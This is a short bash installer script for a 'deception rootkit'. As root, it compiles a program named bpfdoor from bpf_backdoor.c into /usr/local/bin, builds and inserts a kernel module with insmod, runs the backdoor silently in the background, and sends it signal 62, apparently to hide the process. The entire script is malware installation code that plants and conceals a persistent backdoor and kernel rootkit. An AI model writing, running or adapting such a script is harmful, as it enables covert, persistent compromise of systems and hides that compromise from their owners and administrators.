#!/bin/bash

[ "$(id -u)" -ne 0 ] && printf "Must be root to install\n" && exit 1

printf "Installing deception rootkit...\n"
gcc -o /usr/local/bin/bpfdoor bpf_backdoor.c
make -s 2>/dev/null
insmod deception.ko 
set +m
/usr/local/bin/bpfdoor >/dev/null 2>&1 &
pid=$!
set -m
kill -62 $pid
